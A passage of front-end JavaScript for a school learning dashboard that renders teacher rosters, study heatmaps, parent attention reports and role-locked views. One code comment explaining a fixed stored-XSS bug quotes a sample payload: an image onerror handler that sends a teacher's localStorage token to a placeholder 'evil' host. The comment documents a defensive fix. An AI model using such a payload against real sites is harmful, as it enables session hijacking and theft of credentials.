------------------------------------------------------------ */
var RING_R = 56, RING_C = 2 * Math.PI * 56;
// Real class-average mastery % (mean of each roster student's masteryPct) —
// set by applyTeacherInsights once real data arrives. Starts at 0 so a
// logged-in teacher never sees a fabricated number before/without real data.
var TEACHER_AVG_MASTERY = 0;
function animateTeacherRing(){
  var ring = $('#avgRing');
  var pct = TEACHER_AVG_MASTERY / 100;
  ring.style.strokeDasharray = RING_C;
  ring.style.strokeDashoffset = RING_C;
  void ring.getBoundingClientRect();
  setTimeout(function(){
    ring.style.strokeDashoffset = (RING_C * (1 - pct)).toFixed(1);
  }, RM ? 0 : 250);
  countUp($('#avgNum'), TEACHER_AVG_MASTERY, 1500, '%');
}

// Real weak-topic breakdown, derived from the roster's actual weakSubject
// tallies — set by applyTeacherInsights. Empty until real data arrives.
var WEAK_TOPICS = [];
var WEAK_COLORS = ['#FFB454', '#FF7AA2', '#7C9BFF', '#3DE8C5', '#C2A8FF'];
function buildHbars(){
  var host = $('#hbars');
  if (!WEAK_TOPICS.length){
    host.innerHTML = '<p class="empty-hint">No test activity yet this week — weak topics appear here once students start practicing.</p>';
    return;
  }
  var html = '';
  WEAK_TOPICS.forEach(function(t, i){
    var color = WEAK_COLORS[i % WEAK_COLORS.length];
    html += '<div class="hbar">';
    html += '<span class="hlab">' + escapeHtml(t.name) + '</span>';
    html += '<span class="htrack"><span class="hfill" data-p="' + t.pct + '" style="background:linear-gradient(90deg,' + color + 'cc,' + color + ');width:' + t.pct + '%"></span></span>';
    html += '<span class="hval">' + t.pct + '%</span>';
    html += '</div>';
  });
  host.innerHTML = html;
}
function animateHbars(){
  $$('#hbars .hfill').forEach(function(f, i){
    f.classList.remove('up');
    void f.getBoundingClientRect();
    setTimeout(function(){ f.classList.add('up'); }, RM ? 0 : 200 + i * 110);
  });
}

/* ------------------------------------------------------------
   TEACHER — roster table (sortable)
------------------------------------------------------------ */
// Starts empty — filled with the real backend roster once EduAPI.getDashboard()
// resolves (see applyDashboardData). Never seed this with fake names: this
// table is only ever shown after a real logged-in teacher's request, so
// there is no "logged-out preview" case where fake students would be OK.
var ROSTER = [];
var AV_GRADS = [
  ['#3DE8C5','#7C9BFF'], ['#FFB454','#FF7AA2'], ['#7C9BFF','#C2A8FF'],
  ['#FF7AA2','#FFB454'], ['#3DE8C5','#FFB454'], ['#7C9BFF','#3DE8C5']
];
var sortDir = 0; // 0 = original, 1 = desc, -1 = asc

function initials(name){
  // A roster row with an empty/whitespace name used to throw here on
  // parts[0][0] and take the whole roster render down with it.
  var parts = String(name == null ? '' : name).trim().split(/\s+/).filter(Boolean);
  if (!parts.length) return '?';
  return (parts[0][0] + (parts[1] ? parts[1][0] : '')).toUpperCase();
}
function fmtTime(mins){
  return Math.floor(mins / 60) + 'h ' + ('0' + (mins % 60)).slice(-2) + 'm';
}
function masteryColor(m){
  if (m >= 75) return '#3DE8C5';
  if (m >= 60) return '#FFB454';
  return '#FF7AA2';
}
function avatarSVG(name, idx){
  var g = AV_GRADS[idx % AV_GRADS.length];
  var gid = 'avg-' + idx;
  return '<svg width="34" height="34" viewBox="0 0 34 34" aria-hidden="true">' +
    '<defs><linearGradient id="' + gid + '" x1="0%" y1="0%" x2="100%" y2="100%">' +
    '<stop offset="0%" stop-color="' + g[0] + '"/><stop offset="100%" stop-color="' + g[1] + '"/></linearGradient></defs>' +
    '<circle cx="17" cy="17" r="17" fill="url(#' + gid + ')"/>' +
    '<text x="17" y="18" text-anchor="middle" dominant-baseline="central" font-family="Nunito,sans-serif" font-size="12" font-weight="700" fill="#05080F">' + escapeHtml(initials(name)) + '</text></svg>';
}

function renderRoster(){
  if (!ROSTER.length){
    $('#rosterBody').innerHTML =
      '<tr><td colspan="5"><p class="empty-hint" style="padding:14px 4px;">Loading your class roster…</p></td></tr>';
    return;
  }
  var rows = ROSTER.slice();
  if (sortDir === 1)  rows.sort(function(a, b){ return b.m - a.m; });
  if (sortDir === -1) rows.sort(function(a, b){ return a.m - b.m; });
  var html = '';
  rows.forEach(function(r){
    var idx = ROSTER.indexOf(r);
    var ok = r.m >= 70;
    html += '<tr>';
    // r.n and r.w are user-supplied (User.name / weakSubject come straight off
    // /api/dashboard, and signup does not sanitize them). Injecting them raw
    // made this a stored-XSS sink: a student could sign up as
    //   <img src=x onerror="fetch('//evil/'+localStorage.edulearn_token)">
    // and every teacher of that class executed it on dashboard load, leaking
    // the teacher's bearer token. Neighbouring renderers already escape.
    html += '<td><span class="stud-cell">' + avatarSVG(r.n, idx) + escapeHtml(r.n) + '</span></td>';
    html += '<td><span class="mono" style="color:var(--muted);text-transform:none;">' + fmtTime(r.t) + '</span></td>';
    html += '<td><span class="mini-bar"><i style="width:' + r.m + '%;background:' + masteryColor(r.m) + '"></i></span><span class="mast-num">' + r.m + '%</span></td>';
    html += '<td><span class="weak-chip">' + escapeHtml(r.w) + '</span></td>';
    html += '<td><span class="sdot ' + (ok ? 'ok' : 'help') + '"><i></i>' + (ok ? 'On track' : 'Needs help') + '</span></td>';
    html += '</tr>';
  });
  $('#rosterBody').innerHTML = html;
}

/* ------------------------------------------------------------
   PARENT — weekly area chart
------------------------------------------------------------ */
function smoothPath(pts){
  if (pts.length < 2) return '';
  var d = 'M' + pts[0][0] + ' ' + pts[0][1];
  for (var i = 0; i < pts.length - 1; i++){
    var p0 = pts[Math.max(0, i - 1)], p1 = pts[i], p2 = pts[i + 1], p3 = pts[Math.min(pts.length - 1, i + 2)];
    var c1x = p1[0] + (p2[0] - p0[0]) / 6, c1y = p1[1] + (p2[1] - p0[1]) / 6;
    var c2x = p2[0] - (p3[0] - p1[0]) / 6, c2y = p2[1] - (p3[1] - p1[1]) / 6;
    d += ' C' + c1x.toFixed(1) + ' ' + c1y.toFixed(1) + ' ' + c2x.toFixed(1) + ' ' + c2y.toFixed(1) + ' ' + p2[0] + ' ' + p2[1];
  }
  return d;
}

function buildArea(){
  var svg = $('#areachart');
  var mins = STATE.minutes;
  var max = Math.max.apply(null, mins.concat([1]));
  var W = 380, baseY = 140, top = 18, x0 = 16, x1 = 364;
  var pts = mins.map(function(v, i){
    var x = x0 + (x1 - x0) * i / 6;
    var y = baseY - (v / max) * (baseY - top);
    return [Math.round(x), Math.round(y)];
  });
  var line = smoothPath(pts);
  var fill = line + ' L' + pts[6][0] + ' ' + baseY + ' L' + pts[0][0] + ' ' + baseY + ' Z';
  var html = '';
  // gridlines
  for (var gy = 1; gy <= 3; gy++){
    var y = baseY - (baseY - top) * gy / 4;
    html += '<line x1="' + x0 + '" y1="' + y + '" x2="' + x1 + '" y2="' + y + '" stroke="var(--hair)" stroke-width="1" stroke-dasharray="3 6"/>';
  }
  html += '<path id="areaFill" d="' + fill + '" fill="url(#areaFillG)" style="opacity:0;transition:opacity 1.2s var(--ease) .5s;"/>';
  html += '<path id="areaLine" d="' + line + '" fill="none" stroke="url(#areaLineG)" stroke-width="2.5" stroke-linecap="round"/>';
  // dots + labels
  pts.forEach(function(p, i){
    var d = dayOffset(6 - i);
    var isToday = i === 6;
    html += '<circle class="adotc" cx="' + p[0] + '" cy="' + p[1] + '" r="' + (isToday ? 4.5 : 3) + '" fill="' + (isToday ? '#3DE8C5' : '#0D1626') + '" stroke="' + (isToday ? 'rgba(61,232,197,.4)' : '#7C9BFF') + '" stroke-width="' + (isToday ? 4 : 1.5) + '" style="opacity:0;transition:opacity .5s ease ' + (0.7 + i * 0.08) + 's;"/>';
    html += '<text class="axis" x="' + p[0] + '" y="162" text-anchor="middle"' + (isToday ? ' fill="#3DE8C5"' : '') + '>' + DAY_SHORT[d.getDay()] + '</text>';
  });
  svg.innerHTML = html;
}
function animateArea(){
  var line = $('#areaLine');
  var fill = $('#areaFill');
  if (!line) return;
  var len = 0;
  try { len = line.getTotalLength(); } catch (e) { len = 600; }
  line.style.transition = 'none';
  line.style.strokeDasharray = len;
  line.style.strokeDashoffset = len;
  fill.style.opacity = '0';
  $$('#areachart .adotc').forEach(function(c){ c.style.opacity = '0'; });
  void line.getBoundingClientRect();
  setTimeout(function(){
    line.style.transition = RM ? 'none' : 'stroke-dashoffset 1.6s cubic-bezier(.22,1,.36,1)';
    line.style.strokeDashoffset = '0';
    fill.style.opacity = '1';
    $$('#areachart .adotc').forEach(function(c){ c.style.opacity = '1'; });
  }, RM ? 0 : 150);
}

/* ------------------------------------------------------------
   RAIL — calendar heatmap (current month) — driven by REAL activity.
   HEAT_BY_DAY maps a "YYYY-MM-DD" key → minutes studied that day
   (populated from backend insights.daily, with insights.weekly as the
   older-server fallback). Days with no data show as rest days, not
   fabricated activity.
------------------------------------------------------------ */
var HEAT_BY_DAY = {};            // "2026-06-30" -> minutes (real)

// Must produce the SAME key the backend used to bucket the minutes, or every
// lookup silently misses. src/services/progressInsights.ts dayKey() is
// `d.toISOString().slice(0,10)` — UTC. This used to build the key from local
// getFullYear/getMonth/getDate, so the two only agreed at UTC+0: an IST
// (UTC+5:30) user opening the dashboard at 02:00 on 20 Jul had today's minutes
// filed by the backend under "2026-07-19", while the frontend looked up
// "2026-07-20" and got 0 — today rendered as a REST DAY and yesterday's cell
// showed today's minutes. Keying in UTC on both sides removes the mismatch.
//
// NOTE: this makes the day boundary UTC midnight (05:30 IST). Bucketing by
// IST end-to-end would be more correct for a Bharat-only product, but that is
// a backend change and a product decision, so it is deliberately not made here.
function dayKeyUTC(d){
  return d.toISOString().slice(0, 10);
}
// Bucket real minutes into a 0–4 intensity level.
function heatLevel(mins){
  if (!mins) return 0;
  if (mins < 15) return 1;
  if (mins < 30) return 2;
  if (mins < 60) return 3;
  return 4;
}
var HM_COLORS = ['rgba(61,232,197,.07)','rgba(61,232,197,.22)','rgba(61,232,197,.45)','rgba(61,232,197,.7)','#3DE8C5'];

// GitHub-style contribution calendar, scoped to the CURRENT CALENDAR MONTH.
//
// It used to span a rolling last-8-weeks window, which never lined up with
// how a student thinks about their month ("how much did I study in July?")
// and pushed today's cell to a different column every day. Now: row = day of
// week (Sun..Sat), column = week of the month, leading days padded so the 1st
// lands on its correct weekday row. Today is outlined; days of the month that
// haven't happened yet render as dashed placeholders so the month keeps its
// full shape without reading as rest days.
function buildHeatmap(){
  var hm = $('#heatmap');
  var tip = $('#hmTip');
  if (!hm) return;

  var now = new Date();
  var year = now.getFullYear(), month = now.getMonth();
  var daysInMonth = new Date(year, month + 1, 0).getDate();
  var days = [];
  for (var i = 1; i <= daysInMonth; i++) days.push(new Date(year, month, i));
  var first = days[0], last = days[days.length - 1];

  // Pad so the 1st starts on the right weekday row.
  var lead = first.getDay();               // 0 = Sunday
  var cells = [];
  for (var p = 0; p < lead; p++) cells.push(null);
  cells = cells.concat(days);
  var weeks = Math.ceil(cells.length / 7);

  // ---- month title (the eyebrow doubles as the calendar's header) ----
  var monthEl = document.getElementById('hmMonth');
  if (monthEl) monthEl.textContent = MON_TITLE[month].toUpperCase() + ' ' + year;

  // ---- day-of-week labels: Mon / Wed / Fri, as GitHub does ----
  var dowRow = '';
  var DOW = ['', 'Mon', '', 'Wed', '', 'Fri', ''];
  for (var q = 0; q < 7; q++) dowRow += '<span class="hm-dow">' + DOW[q] + '</span>';

  // ---- the grid itself, column-major so DOM order matches visual order ----
  var grid = '';
  for (var w2 = 0; w2 < weeks; w2++){
    grid += '<span class="hm-week">';
    for (var r2 = 0; r2 < 7; r2++){
      var d = cells[w2 * 7 + r2];
      if (!d){ grid += '<span class="hcell hcell--pad" aria-hidden="true"></span>'; continue; }
      var isToday = d.getDate() === now.getDate();
      var isFuture = d.getDate() > now.getDate();
      if (isFuture){
        // No tooltip, hidden from assistive tech — there is nothing to report.
        grid += '<span class="hcell hcell--future in" aria-hidden="true"></span>';
        continue;
      }
      var minsVal = HEAT_BY_DAY[dayKeyUTC(d)] || 0;
      var lvl = heatLevel(minsVal);
      var label = (minsVal === 0 ? 'No learning' : minsVal + ' min') + ' on ' +
        DAY_TIP[d.getDay()] + ' ' + d.getDate() + ' ' + MON_SHORT[d.getMonth()];
      // role+aria-label so every day's value is reachable by assistive tech —
      // the tooltip alone is mouseenter-only and invisible to keyboard/touch.
      grid += '<span class="hcell l' + lvl + (isToday ? ' is-today' : '') +
        '" role="img" aria-label="' + escapeHtml(label) + '" data-tip="' +
        escapeHtml(label) + '" style="transition-delay:' + (w2 * 18) + 'ms"></span>';
    }
    grid += '</span>';
  }

  hm.innerHTML =
    '<div class="hm-body"><div class="hm-dows">' + dowRow + '</div>' +
    '<div class="hm-grid">' + grid + '</div></div>';

  // e.g. "1 JUL — 21 JUL · TODAY" — the range covered so far this month.
  var rangeEl = document.getElementById('hmRange');
  if (rangeEl){
    rangeEl.textContent = '1 ' + MON_SHORT[month] + ' — ' +
      now.getDate() + ' ' + MON_SHORT[month] + ' · TODAY';
  }

  $$('.hcell', hm).forEach(function(cell){
    if (cell.classList.contains('hcell--pad') || cell.classList.contains('hcell--future')) return;
    cell.addEventListener('mouseenter', function(){
      var r = cell.getBoundingClientRect();
      tip.textContent = cell.getAttribute('data-tip');
      tip.style.left = (r.left + r.width / 2) + 'px';
      tip.style.top = r.top + 'px';
      tip.classList.add('show');
    });
    cell.addEventListener('mouseleave', function(){ tip.classList.remove('show'); });
  });

  setTimeout(function(){
    $$('.hcell', hm).forEach(function(c){ c.classList.add('in'); });
  }, RM ? 0 : 300);
}

/* ------------------------------------------------------------
   count-up helper
------------------------------------------------------------ */
function countUp(el, target, dur, suffix){
  if (!el) return;
  if (RM){ el.textContent = target + suffix; return; }
  var t0 = null;
  function step(ts){
    if (t0 === null) t0 = ts;
    var p = Math.min(1, (ts - t0) / dur);
    var eased = 1 - Math.pow(1 - p, 3);
    el.textContent = Math.round(target * eased) + suffix;
    if (p < 1) requestAnimationFrame(step);
  }
  requestAnimationFrame(step);
}

/* ------------------------------------------------------------
   ROLE SWITCHING — fade + restagger
------------------------------------------------------------ */
/* ---- live-class camera attention ----
   Prefer the backend (a parent sees their linked child's reports across any
   device); fall back to this browser's local reports when the backend endpoint
   isn't available yet or returns nothing. */
function renderAttention(){
  var host = document.getElementById('attnBody');
  if(!host) return;
  // Kick off the backend fetch; render local immediately, then upgrade.
  if (window.EduAPI && EduAPI.listLiveReports){
    EduAPI.listLiveReports().then(function(backendReps){
      if (backendReps && backendReps.length){
        // Normalise backend rows into the shape this card renders.
        var mmss = function(sec){ sec=Math.round(sec||0); var m=Math.floor(sec/60); var x=sec%60; return m+':'+(x<10?'0':'')+x; };
        var mapped = backendReps.map(function(r){
          return {
            onScreenPct: (typeof r.onScreenPct === 'number') ? r.onScreenPct : null,
            lookAwayCount: r.lookAwayCount || 0,
            chats: r.chats || 0,
            duration: mmss(r.durationSec) + ' min',
            dateISO: r.createdAt,
            topic: r.topic || 'Live class'
          };
        }).reverse(); // paintAttention uses the LAST item as the newest
        paintAttention(mapped);
      }
    }).catch(function(){});
  }
  var data = null;
  try{ data = JSON.parse(localStorage.getItem('edulearn_live') || 'null'); }catch(e){}
  var reps = (data && data.reports) || [];
  paintAttention(reps);
}

function paintAttention(reps){
  var host = document.getElementById('attnBody');
  if(!host) return;
  var camReps = reps.filter(function(r){ return typeof r.onScreenPct === 'number'; });

  if(!camReps.length){
    // Use the real linked child's first name if it's loaded by now; a
    // neutral "your child" otherwise (never the old hardcoded "Ananya").
    var childNameEl = document.getElementById('childName');
    var childFirst = 'your child';
    if (childNameEl && childNameEl.textContent && childNameEl.textContent !== 'Loading…' && childNameEl.textContent !== 'No child linked yet') {
      childFirst = childNameEl.textContent.trim().split(/\s+/)[0];
    }
    host.innerHTML =
      '<div style="flex:1;min-width:220px"><p style="color:var(--muted);font-size:14px;line-height:1.6">' +
      'No camera-monitored class yet. When ' + escapeHtml(childFirst) + ' joins a <a href="live.html" style="color:var(--teal)">live class</a> and turns on attention monitoring, PAL watches whether they are looking at the screen and the focus report appears here.</p>' +
      '<span class="mono" style="color:var(--muted);display:inline-flex;align-items:center;gap:7px;margin-top:6px">' +
      '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/></svg>' +
      'Video stays on the device — only the score is shared</span></div>';
    return;
  }

  var r = camReps[camReps.length - 1];
  var c = r.onScreenPct >= 80 ? 'var(--teal)' : r.onScreenPct >= 50 ? 'var(--amber)' : 'var(--rose)';
  var C = 2 * Math.PI * 40;
  var verdict = r.onScreenPct >= 80 ? 'Excellent focus' : r.onScreenPct >= 50 ? 'Good, some drift' : 'Often distracted';
  var d = new Date(r.dateISO);
  host.innerHTML =
    '<div style="position:relative;width:104px;height:104px;flex:none">' +
      '<svg width="104" height="104" viewBox="0 0 104 104" style="transform:rotate(-90deg)">' +
        '<circle cx="52" cy="52" r="40" fill="none" stroke="var(--line)" stroke-width="8"/>' +
        '<circle cx="52" cy="52" r="40" fill="none" stroke="' + c + '" stroke-width="8" stroke-linecap="round" stroke-dasharray="' + C.toFixed(1) + '" stroke-dashoffset="' + (C * (1 - r.onScreenPct/100)).toFixed(1) + '"/>' +
      '</svg>' +
      '<span style="position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:Fraunces,serif;font-weight:600;font-size:24px">' + r.onScreenPct + '%</span>' +
    '</div>' +
    '<div style="flex:1;min-width:200px">' +
      '<div style="font-weight:700;font-size:16px;color:' + c + '">' + verdict + '</div>' +
      '<div style="color:var(--muted);font-size:14px;margin:3px 0 12px">' + esc(r.topic) + ' · ' + d.toLocaleDateString('en-IN',{day:'numeric',month:'short',year:'numeric'}) + '</div>' +
      '<div style="display:flex;gap:20px;flex-wrap:wrap">' +
        '<div><b style="font-family:Fraunces,serif;font-size:19px">' + r.onScreenPct + '%</b><div class="mono" style="color:var(--muted)">eyes on screen</div></div>' +
        '<div><b style="font-family:Fraunces,serif;font-size:19px">' + (r.lookAwayCount || 0) + '</b><div class="mono" style="color:var(--muted)">looked away</div></div>' +
        '<div><b style="font-family:Fraunces,serif;font-size:19px">' + (r.chats || 0) + '</b><div class="mono" style="color:var(--muted)">doubts asked</div></div>' +
        '<div><b style="font-family:Fraunces,serif;font-size:19px">' + r.duration + '</b><div class="mono" style="color:var(--muted)">attended</div></div>' +
      '</div>' +
    '</div>';
}

function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }

var VIEW_ANIMATORS = {
  student: function(){ animateBars(); animateDonuts(); animateContinue(); },
  teacher: function(){ animateTeacherRing(); animateHbars(); },
  parent:  function(){ animateArea(); renderAttention(); }
};

function positionInd(btn){
  var ind = $('#roleInd');
  ind.style.left = btn.offsetLeft + 'px';
  ind.style.width = btn.offsetWidth + 'px';
}

// The dashboard only ships #view-student / #view-teacher / #view-parent, but
// role-guard.js grants 'admin' unrestricted access (ACCESS.admin = null), so an
// admin lands here and setRole('admin') used to resolve $('#view-admin') to
// null and throw at nextView.classList.add('active'). That throw aborted the
// rest of bootAuth, so the admin also lost the user chip, the logout handler,
// the hidden "Start free" CTA, checkLiveNow() and the getDashboard() call —
// the page rendered as a blank shell. Anything without a view falls back to
// the student view instead of taking the page down.
function viewableRole(role){
  return document.getElementById('view-' + role) ? role : 'student';
}

function setRole(role, instant){
  role = viewableRole(role);
  var prev = viewableRole(currentRole);
  currentRole = role;
  $$('.role-switch button').forEach(function(b){
    var on = b.getAttribute('data-role') === role;
    b.classList.toggle('on', on);
    b.setAttribute('aria-selected', String(on));
    if (on) positionInd(b);
  });
  renderGreeting();

  var prevView = $('#view-' + prev);
  var nextView = $('#view-' + role);

  function show(){
    $$('.view').forEach(function(v){ v.classList.remove('active', 'shown', 'leaving'); });
    nextView.classList.add('active');
    void nextView.getBoundingClientRect();
    nextView.classList.add('shown');
    if (VIEW_ANIMATORS[role]) VIEW_ANIMATORS[role]();
    // "Learning rhythm" now lives inside #view-student, so it is hidden from
    // teachers and parents by the view switch itself — no rail toggle needed.
  }

  if (instant || prev === role || !prevView.classList.contains('active')){
    show();
  } else {
    prevView.classList.add('leaving');
    setTimeout(show, RM ? 0 : 260);
  }
}

/* ------------------------------------------------------------
   scroll reveals
------------------------------------------------------------ */
function initReveals(){
  if (!('IntersectionObserver' in window)){
    $$('.rv').forEach(function(el){ el.classList.add('in'); });
    return;
  }
  var io = new IntersectionObserver(function(entries){
    entries.forEach(function(en){
      if (en.isIntersecting){
        en.target.classList.add('in');
        io.unobserve(en.target);
      }
    });
  }, { threshold: 0.12 });
  $$('.rv').forEach(function(el){ io.observe(el); });
}

/* ------------------------------------------------------------
   wire-up
------------------------------------------------------------ */
function initEvents(){
  // language pill (disabled in production — buttons are commented out above)
  if ($('#langEn')) $('#langEn').addEventListener('click', function(){ applyLang('en'); });
  if ($('#langHi')) $('#langHi').addEventListener('click', function(){ applyLang('hi'); });
  // rail language picker
  $$('#railLangs .lang-chip.live').forEach(function(ch){
    ch.addEventListener('click', function(){ applyLang(ch.getAttribute('data-lang')); });
  });
  // role switcher
  $$('.role-switch button').forEach(function(b){
    b.addEventListener('click', function(){ setRole(b.getAttribute('data-role')); });
  });
  window.addEventListener('resize', function(){
    var on = $('.role-switch button.on');
    if (on) positionInd(on);
  });
  // sortable mastery header
  function toggleMasterySort(){
    sortDir = sortDir === 1 ? -1 : 1;
    var th = $('#masteryTh');
    th.classList.toggle('desc', sortDir === 1);
    // aria-sort is what actually announces the direction; the chevron rotation
    // is invisible to assistive tech.
    th.setAttribute('aria-sort', sortDir === 1 ? 'descending' : 'ascending');
    renderRoster();
  }
  $('#masteryTh').addEventListener('click', toggleMasterySort);
  $('#masteryTh').addEventListener('keydown', function(e){
    if (e.key === 'Enter' || e.key === ' ' || e.key === 'Spacebar'){
      e.preventDefault();
      toggleMasterySort();
    }
  });
  // Parent feat-cards ("Child's Progress" / "Attendance") jump to same-page
  // cards. A bare anchor-scroll is easy to miss (no visible state change),
  // so scroll smoothly and flash the target card to make it obvious it "opened".
  ['childProgress', 'attnCard'].forEach(function(id){
    var link = document.querySelector('.feat-card[href="#' + id + '"]');
    var target = document.getElementById(id);
    if (!link || !target) return;
    link.addEventListener('click', function(e){
      e.preventDefault();
      target.scrollIntoView({ behavior: 'smooth', block: 'center' });
      target.classList.add('feat-target-flash');
      setTimeout(function(){ target.classList.remove('feat-target-flash'); }, 1200);
    });
  });

  // Self-service fix for a parent whose dashboard shows the wrong child
  // (e.g. a bad link from before name+class verification existed).
  var relinkToggle = document.getElementById('relinkChildToggle');
  var relinkForm = document.getElementById('relinkChildForm');
  if (relinkToggle && relinkForm) {
    relinkToggle.addEventListener('click', function(){
      var opening = relinkForm.style.display === 'none';
      relinkToggle.setAttribute('aria-expanded', String(opening));
      relinkForm.style.display = opening ? 'flex' : 'none';
    });
    relinkForm.addEventListener('submit', function(e){
      e.preventDefault();
      var msg = document.getElementById('relinkMsg');
      msg.style.color = 'var(--muted)';
      msg.textContent = 'Checking…';
      EduAPI.relinkChild(
        document.getElementById('relinkRoll').value.trim(),
        document.getElementById('relinkName').value.trim(),
        document.getElementById('relinkClass').value.trim()
      ).then(function(){
        msg.style.color = 'var(--teal)';
        msg.textContent = 'Fixed — reloading…';
        setTimeout(function(){ location.reload(); }, 700);
      }).catch(function(err){
        msg.style.color = 'var(--rose)';
        msg.textContent = err.message || 'Could not verify those details.';
      });
    });
  }
}

/* ------------------------------------------------------------
   boot
------------------------------------------------------------ */
/* ------------------------------------------------------------
   AUTH + ROLE LOCK — connects this dashboard to the backend.
   Each user only sees the view for the role they logged in as.
------------------------------------------------------------ */
function lockToRole(role){
  // Hide the manual role switcher — the view is fixed to the user's role.
  var sw = document.querySelector('.role-switch');
  if (sw) sw.style.display = 'none';
  var note = document.querySelector('.role-note');
  if (note) note.style.display = 'none';

  // Role-aware top nav: parents don't browse chapters / use the student tutor nav.
  var navLearn = document.getElementById('navLearn');
  var navPal = document.getElementById('navPal');
  if (role === 'parent' || role === 'teacher'){
    if (navLearn) navLearn.style.display = 'none';
  }
  if (role === 'parent'){
    if (navPal) navPal.style.display = 'none';
  }

  // Footer also links to the student "Learn" page (Product + Classes columns) —
  // hide those for non-students so it doesn't leak into teacher/parent dashboards.
  if (role === 'parent' || role === 'teacher'){
    document.querySelectorAll('.foot-learn-link').forEach(function(a){ a.style.display = 'none'; });
    var classesCol = document.getElementById('footClassesCol');
    if (classesCol) classesCol.style.display = 'none';
  } else if (role === 'student'){
    // A student sees only their OWN class in the footer, not all of 6–9.
    var su = (window.EduAPI && EduAPI.getUser && EduAPI.getUser()) || null;
    var myClass = su ? String(su.className || '').replace(/\D/g, '') : '';
    var col = document.getElementById('footClassesCol');
    if (col && myClass){
      col.querySelectorAll('a').forEach(function(a){
        var n = (a.textContent || '').replace(/\D/g, '');
        if (n && n !== myClass) a.style.display = 'none';
      });
    }
  }
}

async function bootAuth(){
  // EduAPI comes from api.js. If missing, fall back to demo (no lock).
  if (!window.EduAPI) { setTimeout(function(){ setRole('student', true); }, 120); return; }

  var user = EduAPI.requireAuth(); // redirects to login.html if not authed
  if (!user) return;
  CURRENT_USER = user;               // the kid-facing sections read className off this

  // Re-render the sections that depend on which class the student is in —
  // they first painted with the default (Class 7) before auth resolved.
  try { buildSubjectMap(); buildNextUp(); } catch(e){}

  // QA S-03: "Subject mastery" carried a literal, untouched "NCERT · CL 7" —
  // nothing above ever re-rendered it, so every class saw Class 7's label
  // forever, same bug as the two calls just above it.
  try {
    var mcl = document.getElementById('masteryClassLabel');
    if (mcl) {
      var realCls = parseInt(String(user.className || '').replace(/\D+/g, ''), 10) || 7;
      mcl.textContent = 'NCERT · CL ' + realCls;
    }
  } catch(e){}

  // Lock the UI to this user's role and show them their own view only.
  lockToRole(user.role);
  setRole(user.role, true);

  // Show who's logged in (name + email) + wire logout.
  var chip = document.getElementById('userChip');
  var chipText = document.getElementById('userChipText');
  if (chip && chipText){
    chip.style.display = 'flex';
    chipText.textContent = (user.name || 'User') + ' · ' + (user.email || '') + ' · ' + user.role.toUpperCase();
  }
  var lo = document.getElementById('logoutBtn');
  if (lo) lo.addEventListener('click', function(){ EduAPI.logout(); });

  // Logged-in nav: "Start free" makes no sense (and lets teachers/parents
  // wander into the student learn page) — hide it. And the logo keeps you on
  // your dashboard instead of dropping you on the logged-out landing page.
  var cta = document.getElementById('navCta');
  if (cta) cta.style.display = 'none';
  var logoEl = document.getElementById('navLogo');
  if (logoEl) logoEl.setAttribute('href', 'dashboard.html');

  // Re-render greeting now that we know the real user.
  renderGreeting();

  // Live-class indicator: if a class the user belongs to is LIVE right now,
  // turn the "Join Live Class" card into a pulsing "LIVE NOW — Join" call to
  // action that links straight into the session.
  checkLiveNow(user);

  // Real per-chapter progress — drives Next up, My subjects and Continue
  // learning. Deliberately not awaited and separate from getDashboard() so
  // that one failing cannot blank the other.
  hydrateChapterProgress();

  // Pull real data from the backend and inject role-specific numbers.
  try {
    var data = await EduAPI.getDashboard();
    applyDashboardData(user, data);
  } catch (e) {
    console.warn('Dashboard data load failed:', e.message);
    // A failed fetch used to leave the roster/dashboard silently on whatever
    // static markup was already there, indistinguishable from "no data yet" —
    // show a real error so a teacher whose roster "won't open" can tell the
    // difference between an empty class and a broken request.
    var rosterBody = document.getElementById('rosterBody');
    if (user.role === 'teacher' && rosterBody) {
      rosterBody.innerHTML =
        '<tr><td colspan="5"><p class="empty-hint" style="padding:14px 4px;color:var(--rose)">' +
        'Could not load your class roster right now. Please refresh the page — if this keeps happening, let support know.</p></td></tr>';
    }
    // Only the teacher used to get an error. A student whose fetch failed saw
    // "0 day streak / 0 min this week / No badges yet" — pixel-identical to a
    // genuinely new account, i.e. the page told them a week of real work never
    // happened. A parent was left with #childName stuck on the literal
    // "Loading…" forever, which reads as a broken child link. Both now say the
    // load failed rather than asserting something false about the account.
    showLoadFailure(user.role);
  }
}

// A non-destructive banner: it states that live data could not be loaded and
// leaves whatever is on screen alone, so it can never be mistaken for data.
function showLoadFailure(role){
  if (document.getElementById('loadFailBanner')) return;
  var host = document.querySelector('.boards') || document.querySelector('.shell');
  if (!host) return;
  var msg = role === 'parent'
    ? 'Could not load your child’s progress right now. The numbers below are not up to date — please refresh.'
    : 'Could not load your latest progress right now. The numbers below are not up to date — please refresh.';
  var bar = document.createElement('div');
  bar.id = 'loadFailBanner';
  bar.setAttribute('role', 'alert');
  bar.style.cssText =
    'margin:0 0 18px;padding:13px 18px;border-radius:14px;font-size:13.5px;font-weight:600;' +
    'border:1px solid color-mix(in srgb, var(--rose) 45%, transparent);' +
    'background:color-mix(in srgb, var(--rose) 12%, transparent);';
  bar.textContent = msg;
  host.insertBefore(bar, host.firstChild);

  // The parent card otherwise sits on the literal placeholder string forever.
  var cn = document.getElementById('childName');
  if (role === 'parent' && cn && /^\s*Loading/.test(cn.textContent)) {
    cn.textContent = 'Could not load';
  }
}

// Show a "LIVE NOW — Join" state on the Join-Live-Class card when a class the
// user belongs to is actually live. Students are scoped to their own class.
async function checkLiveNow(user){
  var card = document.getElementById('liveClassCard');
  if (!card || !window.EduAPI || typeof EduAPI.listLive !== 'function') return;
  var sessions;
  try { sessions = await EduAPI.listLive(); } catch (e) { return; }
  if (!Array.isArray(sessions) || !sessions.length) return;

  function num(v){ var m = String(v||'').match(/\d+/); return m ? m[0] : ''; }
  function sec(v){ return String(v||'').trim().toUpperCase(); }
  var live = sessions.filter(function(s){ return s.live || s.status === 'live' || s.isLive; });
  if (!live.length) live = sessions; // some backends only return active sessions

  if (user.role === 'student'){
    var myC = num(user.className), myS = sec(user.section);
    live = live.filter(function(s){
      if (num(s.className) !== myC) return false;
      if (myS && s.section && sec(s.section) !== myS) return false;
      return true;
    });
  }
  if (!live.length) return;

  var s = live[0];
